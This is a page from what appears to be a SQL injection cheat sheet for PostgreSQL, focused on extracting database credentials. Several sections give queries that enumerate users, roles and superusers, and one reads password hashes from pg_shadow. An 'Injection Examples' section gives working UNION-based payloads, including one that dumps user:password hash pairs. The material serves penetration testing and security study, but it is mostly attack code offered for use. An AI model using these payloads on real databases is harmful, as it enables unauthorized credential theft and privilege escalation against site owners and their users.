---
title: Database Credentials
description: How to retrieve database credentials in PostgreSQL
category: Information Gathering
order: 9
tags: ["credentials", "authentication", "user data"]
lastUpdated: 2025-12-07
---

## Database Credentials

When performing SQL injection attacks against PostgreSQL, extracting database credentials can provide valuable information for further exploitation.

### Current User Information

| Information     | Query                                                        |
| --------------- | ------------------------------------------------------------ |
| Current User    | `SELECT user;`                                               |
| Current User    | `SELECT current_user;`                                       |
| Session User    | `SELECT session_user;`                                       |
| Superuser Check | `SELECT usesuper FROM pg_user WHERE usename = current_user;` |

### User Enumeration

```sql
-- List all database users
SELECT usename FROM pg_user;

-- List all roles
SELECT rolname FROM pg_roles;

-- Get user details
SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user;

-- Find superuser accounts
SELECT usename FROM pg_user WHERE usesuper = true;
```

### Password Hashes

PostgreSQL stores password hashes in the `pg_shadow` table (requires superuser):

```sql
-- Get password hashes (requires superuser privilege)
SELECT usename, passwd FROM pg_shadow;
```

The hash format depends on PostgreSQL version and configuration:

- `md5` + MD5 hash (older default)
- `SCRAM-SHA-256` hash (PostgreSQL 10+ default)

### Role and Privilege Information

```sql
-- Get role memberships
SELECT r.rolname, r.rolsuper, r.rolinherit, r.rolcreaterole,
       r.rolcreatedb, r.rolcanlogin
FROM pg_roles r;

-- Check if current user is superuser
SELECT current_setting('is_superuser');

-- Get granted roles
SELECT grantee, role_name
FROM information_schema.applicable_roles;
```

### Injection Examples

```sql
-- Get current user
' UNION SELECT NULL,current_user,NULL--

-- List all users
' UNION SELECT NULL,usename,NULL FROM pg_user--

-- Get user:password pairs (requires superuser)
' UNION SELECT NULL,usename||':'||passwd,NULL FROM pg_shadow--

-- Check if current user is superuser
' UNION SELECT NULL,usesuper::text,NULL FROM pg_user WHERE usename=current_user--

-- Find superusers
' UNION SELECT NULL,string_agg(usename,','),NULL FROM pg_user WHERE usesuper=true--
```

### Database Authentication Settings

```sql
-- Check authentication method (pg_hba.conf)
-- This requires reading the config file
SELECT current_setting('hba_file');
```

### Notes

- `pg_shadow` requires superuser privileges to access
- `pg_user` is accessible but doesn't contain password hashes
- PostgreSQL 10+ uses SCRAM-SHA-256 by default, which is more secure than MD5
- Password column may be NULL for users without password authentication

For more information on password hashing and cracking, see the related entries on [Password Hashing](/postgresql/password-hashing) and [Password Cracking](/postgresql/password-cracking).
